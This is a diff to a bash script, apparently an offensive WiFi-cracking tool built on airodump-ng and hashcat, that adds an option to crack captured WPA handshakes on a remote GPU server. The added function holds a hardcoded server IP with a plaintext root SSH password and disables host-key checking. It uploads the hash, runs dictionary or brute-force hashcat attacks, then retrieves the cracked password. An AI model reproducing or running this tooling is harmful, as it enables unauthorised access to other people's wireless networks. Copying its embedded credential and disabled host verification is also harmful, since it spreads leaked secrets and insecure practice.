@@ -1,6 +1,6 @@
 #!/bin/bash
 
-version=3.6.8 # 31/5/25 03:50
+version=3.7 # 1/6/25 06:40
 
 
 
@@ -144,9 +144,10 @@ echo -e "${GREEN} ╔═"
 echo -e " ║${RED} ▶ ${WHITE}This script leveraging multiple attack vectors to efficiently capture and crack WiFi credentials"
 echo -e "${GREEN} ║${RED} ▶ ${WHITE}Workflow:${RESET} Scan ➝ Choose network ➝ Attack ➝ Capture ➝ Crack"
 echo -e "${GREEN} ║${RED} ▶ ${WHITE}Powered by:${RESET} airmon-ng, hcxtools, hashcat and more"
-echo -e "${GREEN} ║${RED} ▶ ${WHITE}Changlog:${RESET} Start while connected to internet (for the first time) in order to download dependencies"
+echo -e "${GREEN} ║${RED} ▶ ${WHITE}Start while connected to internet (for the first time) in order to download dependencies"
 echo -e "${GREEN} ║${RED} ▶ ${RESET}The script auto download and installs missing dependencies"
 echo -e "${GREEN} ║${RED} ▶ ${RESET}Run as root or sudo"
+echo -e "${GREEN} ║${RED} ▶ ${WHITE}Changlog:${RESET}Added cracking via GPU Server!"
 echo -e "${GREEN} ╚═${RESET}"
 
 
@@ -255,7 +256,7 @@ function enable_gpu() {
     # Check if running in a VM
     if [[ -n "$(systemd-detect-virt)" && "$(systemd-detect-virt)" != "none" ]]; then
         echo -e "${NEON_YELLOW}${BOLD}    [⚠]${RESET} You are running inside a VM. ${RESET}"
-       # return 1
+#        return 1
     fi
     # Detect GPU
     GPU_INFO=$(lspci -nn | grep -i 'vga\|3d' | grep -i 'nvidia')
@@ -424,7 +425,7 @@ function spoof_adapter_mac() {
 
 function network_scanner() {	
         # Scan 15 seconds for wifi networks   
-        countdown_duration=15
+        countdown_duration=5
         #gnome-terminal --geometry=110x35-10000-10000 -- bash -c "timeout ${countdown_duration}s airodump-ng --band abg ${wifi_adapter} --ignore-negative-one --output-format csv -w $targets_path/Scan/Scan-$current_date"      
         
         timeout ${countdown_duration}s airodump-ng --band abg ${wifi_adapter} --ignore-negative-one --output-format csv -w $targets_path/Scan/Scan-$current_date >/dev/null 2>&1 &
@@ -1001,7 +1002,279 @@ function crack_wep() {
 
 
 
+
+
+
+
+
+
+
+
+
+remote_cracking() {
+    local attack_mode="$1"  # Accept either "dictionary" or "bruteforce"
+    local charset="$2"            # E.g. "-1 ?u?d"
+    local full_mask="$3"          # E.g. "?1?1?1?1"    
+    
+    local TARGET_IP="45.32.110.218"
+    local USER="root"
+    local PASS='@vN7yR85f??He$H%'
+    
+    #read -p "Enter remote server IP: " TARGET_IP
+    #read -s -p "Enter root SSH password: " PASS
+    #echo     
+
+    local REMOTE_PATH="/root"
+    local SSH_OPTIONS="-q -o LogLevel=ERROR -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"
+
+    echo -e "\n\n[*] Copying hash file to $TARGET_IP...\n"
+    sshpass -p "$PASS" scp $SSH_OPTIONS "$targets_path/$bssid_name/hash.hc22000" "$USER@$TARGET_IP:$REMOTE_PATH/hash.hc22000" 2>/dev/null
+
+    echo -e "\n[*] Connecting to $TARGET_IP ...\n"
+
+
+   
+    sshpass -p "$PASS" ssh -T $SSH_OPTIONS "$USER@$TARGET_IP" remote_path="$REMOTE_PATH" wordlists_dir="$wordlists_dir" rockyou_gz="$rockyou_gz" rockyou_file="$rockyou_file" attack_mode="$attack_mode" charset="$charset" full_mask="$full_mask" bash -s <<'ENDSSH'
+   
+    echo -e "\n\n\033[38;5;82m We are in the Server\033[0m\n"
+    
+    
+    #mkdir -p "$remote_path"
+    #cd "$remote_path"
+
+    remote_install_tools() {
+        local PKGS=("hashcat" "wget")
+        local UPDATED_FLAG="/tmp/.apt_updated_once"
+        if [ ! -f "$UPDATED_FLAG" ]; then
+            echo "[*] Running apt update..."
+            sudo apt update || { echo "[ERROR] Failed to update. Exiting."; exit 1; }
+            touch "$UPDATED_FLAG"
+        fi
+        for pkg in "${PKGS[@]}"; do
+            if ! command -v "$pkg" &>/dev/null; then
+                echo "[*] Installing $pkg..."
+                sudo apt install -y "$pkg" || { echo "[ERROR] Could not install $pkg. Exiting."; exit 1; }
+            else
+                echo "[*] $pkg is already installed."
+            fi
+        done
+
+        echo -e "\n[*] Checking wordlists..."
+        mkdir -p "$wordlists_dir"
+        if [ -f "$rockyou_file" ]; then
+            echo "    [✔] rockyou.txt found."
+        elif [ -f "$rockyou_gz" ]; then
+            gzip -d "$rockyou_gz"
+            echo "    [✔] Unzipped rockyou.txt."
+        else
+            echo "    [+] Downloading rockyou.txt..."
+            wget -q -P "$wordlists_dir" https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+        fi
+    }
+
+    remote_enable_gpu() {
+        echo -e "\n[*] Checking for GPU..."
+        if [[ -n "$(systemd-detect-virt)" && "$(systemd-detect-virt)" != "none" ]]; then
+            echo "    [⚠] Running in a virtual environment."
+        fi
+
+        GPU_INFO=$(lspci -nn | grep -i 'vga\|3d' | grep -i 'nvidia')
+        if [[ -z "$GPU_INFO" ]]; then
+            echo "    [✘] No NVIDIA GPU found."
+            return 1
+        fi
+
+        GPU_MODEL=$(echo "$GPU_INFO" | sed -E 's/.*\[(GeForce [^]]+)\].*/\1/')
+        echo "    [✔] Detected GPU: NVIDIA $GPU_MODEL"
+
+        if command -v nvidia-smi &>/dev/null; then
+            CUDA_VERSION=$(nvidia-smi | grep -i "CUDA Version" | awk '{print $6}')
+            echo "    [✔] CUDA Version: $CUDA_VERSION"
+        else
+            echo -e "    [!] CUDA not found. Installing drivers..."
+            apt install -y linux-headers-amd64 nvidia-driver nvidia-cuda-toolkit
+            echo -e "    [!] Please reboot the system for CUDA to work properly."
+            return 1
+        fi
+
+        if hashcat -I | grep -q GPU; then
+            echo "    [✔] Hashcat detects the GPU."
+        else
+            echo "    [✘] Hashcat does not detect the GPU."
+        fi
+    }
+
+    remote_dictionary_attack() {
+        echo -e "\n\n    ->> Cracking WiFi Password using: $rockyou_file\n"
+        status_fifo=$(mktemp -u)
+        mkfifo "$status_fifo"
+        hashcat -m 22000 -a 0 "$remote_path/hash.hc22000" "$rockyou_file" \
+            --outfile "$remote_path/wifi_password.txt" \
+            --force --optimized-kernel-enable --status --status-timer=5 --potfile-disable > "$status_fifo" 2>/dev/null < /dev/null &
+
+        hashcat_pid=$!
+        trap "rm -f \"$status_fifo\"; kill $! 2>/dev/null; exit" INT TERM
+        {
+            while IFS= read -r line; do
+                if [[ "$line" == *"Time.Estimated"* ]]; then
+                    countdown=$(echo "$line" | grep -oP '\(\K[^)]+' | sed 's/^ *//;s/ *$//')
+                    echo -ne "\r    [⏳] Maximum Remaining Time: $countdown   "
+                fi
+            done
+        } < "$status_fifo" &
+        wait $hashcat_pid
+        rm "$status_fifo"
+        echo -e "\n    [✔] Hashcat finished."
+    }
+
+
+    remote_bruteforce_attack() {
+        echo -e "\n\n    ->> Cracking WiFi Password using Brute Force:\n"
+	status_fifo=$(mktemp -u)
+	mkfifo "$status_fifo"
+
+	# Run hashcat with the correct options
+	if [[ -n "$charset" ]]; then      
+		
+		hashcat -a 3 -m 22000 "$remote_path/hash.hc22000" "$charset" "$full_mask" --outfile "$remote_path/wifi_password.txt" --force --optimized-kernel-enable --status --status-timer=1 --potfile-disable > "$status_fifo" 2>/dev/null < /dev/null &
+
+
+		hashcat_pid=$!
+		
+	else
+
+                hashcat -a 3 -m 22000 "$remote_path/hash.hc22000" "$full_mask" --outfile "$remote_path/wifi_password.txt" --force --optimized-kernel-enable --status --status-timer=1 --potfile-disable > "$status_fifo" 2>/dev/null < /dev/null &
+
+		hashcat_pid=$!
+	fi
+
+	trap "rm -f \"$status_fifo\"; kill $! 2>/dev/null; exit" INT TERM
+	{
+	  while IFS= read -r line; do
+	    if [[ "$line" == *"Time.Estimated"* ]]; then
+	      countdown=$(echo "$line" | grep -oP '\(\K[^)]+' | sed 's/^ *//;s/ *$//')
+	      echo -ne "\r    [⏳] Maximum Remaining Time: $countdown   "
+	    fi
+	  done
+	} < "$status_fifo" &
+	wait $hashcat_pid
+	rm "$status_fifo"
+	echo -e "\n${NEON_GREEN}    [✔]${RESET}  Hashcat finished."
+    }
+
+
+
+
+
+    # Main Execution
+    remote_install_tools
+    remote_enable_gpu
+
+
+
+    if [[ "$attack_mode" == "dictionary" ]]; then
+        remote_dictionary_attack
+    elif [[ "$attack_mode" == "bruteforce" ]]; then
+        remote_bruteforce_attack
+    fi
+    
+
+    if [ -f "$remote_path/wifi_password.txt" ]; then
+        echo -e "\n    \033[38;5;82mThe WiFi password was successfully cracked!\033[0m\n"
+        #cat "$remote_path/wifi_password.txt"
+    else
+        echo -e "\n    \033[1;31m[✘] Could not crack the password with the selected wordlist.\033[0m\n"
+    fi    
+    
+    
+    exit
+ENDSSH
+
+    sshpass -p "$PASS" scp $SSH_OPTIONS "$USER@$TARGET_IP:$REMOTE_PATH/wifi_password.txt" "$targets_path/$bssid_name/" 2>/dev/null
+    mv "$targets_path/$bssid_name/wifi_password.txt" "$targets_path/$bssid_name/$bssid_name-wifi_password.txt"
+    cracking_result
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 function dictionary_attack() {
+
+echo "Choose cracking method:"
+echo "1. Use current hardware"
+echo "2. Use remote GPU server"
+read -p "Enter choice (1 or 2): " choice
+
+# Handle choice
+case "$choice" in
+    1)
+        echo "Using current hardware..."
+        # Continue with your local cracking code here
+        ;;
+    2)
+        remote_cracking dictionary
+        exit 0
+        ;;
+    *)
+        echo "Invalid choice. Exiting."
+        exit 1
+        ;;
+esac
+
+
 while true; do
     echo -e "\n    ${BOLD}[?] Choose a Wordlist:${RESET}"
     echo "        1) Use Rockyou"
@@ -1079,58 +1352,11 @@ wait $hashcat_pid
 
 # Cleanup
 rm "$status_fifo"
-echo -e "\n${NEON_GREEN}    [✔]${RESET}  Hashcat finished."
+echo -e "\n${NEON_GREEN}    [✔]${RESET}  Hashcat finished.\n"
 
-
+cracking_result
 # END NEW ##############    
-    
-    
-    
-    
-    
-    
-    
 
-    echo
-    if [ -f "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" ]; then
-        wifi_pass=$(grep "$bssid_name_original" "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" | awk -F"$bssid_name_original:" '{print $2}')
-
-        
-        echo -e "${BLUE}The WiFi password of${RESET} ${RED}$bssid_name_original${RESET} ${BLUE}is:${RESET}	${ORANGE}$wifi_pass${RESET}"
-        bssid_name_escaped=$(printf '%s' "$bssid_name" | sed -e 's/[]\/$*.^[]/\\&/g')
-        
-        
-        
-        #sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with/ { s/\nPassword not cracked with// } }" "$targets_path/wifi_passwords.txt"
-        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with.*/ { s/\nPassword not cracked with.*// } }" "$targets_path/wifi_passwords.txt"
-
-        #sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with/ d; }" "$targets_path/wifi_passwords.txt"
-
-        
-        
-        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a The WiFi password is:   $wifi_pass" "$targets_path/wifi_passwords.txt"
-        rm -r "$targets_path/$bssid_name"
-        exit 1
-    else
-        echo -e "\n${RED}    [✘]${RESET} Couldn't crack the password with the selected wordlist.\n"
-        
-        bssid_name_escaped=$(printf '%s' "$bssid_name" | sed -e 's/[]\/$*.^[]/\\&/g')
-        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a Password not cracked with selected wordlist" "$targets_path/wifi_passwords.txt"
-        
-        echo
-        read -p "    [?] Do you want to try different attack? (Y/n): " choice
-        case $choice in
-            y|Y)
-                choose_attack
-                ;;
-            n|N)
-                another_scan_prompt
-                ;;
-            *)
-                echo -e "${RED}Invalid choice.${RESET} Please enter 'y' or 'n'."
-                ;;
-        esac        
-    fi
 }
 
 
@@ -1138,7 +1364,7 @@ echo -e "\n${NEON_GREEN}    [✔]${RESET}  Hashcat finished."
 function brute-force_attack() {
     
     echo -e "\n   ${RED}->> Brute Forcing WiFi Password with Hashcat${RESET}\n"
-
+    
     # Ask user for password length
     while true; do
         read -p "   Enter password length (WiFi min: 8): " password_length
@@ -1262,6 +1488,32 @@ function brute-force_attack() {
     done
 
     echo -e "\n\n${BOLD}Generated Hashcat mask:${RESET} ${RED}$full_mask${RESET}\n"
+    
+    
+    
+    
+    
+    
+echo "Choose cracking method:"
+echo "1. Use current hardware"
+echo "2. Use remote GPU server"
+read -p "Enter choice (1 or 2): " choice
+
+# Handle choice
+case "$choice" in
+    1)
+        echo "Using current hardware..."
+        # Continue with your local cracking code here
+        ;;
+    2)
+        remote_cracking bruteforce "$charset" "$full_mask"
+        exit 0
+        ;;
+    *)
+        echo "Invalid choice. Exiting."
+        exit 1
+        ;;
+esac        
 
 
 
@@ -1311,17 +1563,10 @@ wait $hashcat_pid
 
 # Cleanup
 rm "$status_fifo"
-echo -e "\n${NEON_GREEN}    [✔]${RESET}  Hashcat finished."
+echo -e "\n${NEON_GREEN}    [✔]${RESET}  Hashcat finished.\n"
 
-
+cracking_result
 # END NEW ##############
-
-
-
-
-
-
-
 
 
 # OLD ###
@@ -1341,41 +1586,8 @@ echo -e "\n${NEON_GREEN}    [✔]${RESET}  Hashcat finished."
 #    fi
    
 # End OLD ###   
-   
-   
-   
-   
-   
-   
-           
-    echo
-    if [ -f "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" ]; then
-        wifi_pass=$(grep "$bssid_name_original" "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" | awk -F"$bssid_name_original:" '{print $2}')
-        echo -e "${BLUE}The WiFi password of${RESET} ${RED}$bssid_name_original${RESET} ${BLUE}is:${RESET}	${ORANGE}$wifi_pass${RESET}"
-        bssid_name_escaped=$(printf '%s' "$bssid_name" | sed -e 's/[]\/$*.^[]/\\&/g')
 
-        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with.*/ { s/\nPassword not cracked with.*// } }" "$targets_path/wifi_passwords.txt"
-        
-        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a The WiFi password is:   $wifi_pass" "$targets_path/wifi_passwords.txt"
-        rm -r $targets_path/"$bssid_name" 
-        exit 1
-    else
-        echo -e "${RED}    [✘]${RESET} Couldn't cracked with Brute-Force with this masking: ${RED}$full_mask${RESET}\n"
-        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a Password not cracked with Brute-Force of this masking: $full_mask" "$targets_path/wifi_passwords.txt"
-        echo
-        read -p "    [?] Do you want to try different attack (Y/n)? " choice
-        case $choice in
-            y|Y)
-                choose_attack
-                ;;
-            n|N)
-                another_scan_prompt
-                ;;
-            *)
-                echo -e "${RED}Invalid choice.${RESET} Please enter 'y' or 'n'."
-                ;;
-        esac        
-    fi    
+  
 }
 
 
@@ -1417,6 +1629,38 @@ function another_scan_prompt() {
         esac
     done
 }
+
+
+
+function cracking_result() {
+
+    if [ -f "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" ]; then
+        wifi_pass=$(grep "$bssid_name_original" "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" | awk -F"$bssid_name_original:" '{print $2}')
+        echo -e "${BLUE}The WiFi password of${RESET} ${RED}$bssid_name_original${RESET} ${BLUE}is:${RESET}	${ORANGE}$wifi_pass${RESET}"
+        bssid_name_escaped=$(printf '%s' "$bssid_name" | sed -e 's/[]\/$*.^[]/\\&/g')
+        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked.*/ { s/\nPassword not cracked.*// } }" "$targets_path/wifi_passwords.txt"
+        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a The WiFi password is:   $wifi_pass" "$targets_path/wifi_passwords.txt"
+        rm -r $targets_path/"$bssid_name" 
+        exit 1
+    else
+        echo -e "${RED}    [✘]${RESET} Couldn't cracked with this cracking method\n"
+        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a Password not cracked." "$targets_path/wifi_passwords.txt"
+        echo
+        read -p "    [?] Do you want to try different attack (Y/n)? " choice
+        case $choice in
+            y|Y)
+                choose_attack
+                ;;
+            n|N)
+                another_scan_prompt
+                ;;
+            *)
+                echo -e "${RED}Invalid choice.${RESET} Please enter 'y' or 'n'."
+                ;;
+        esac        
+    fi    
+}
+
 
 
 
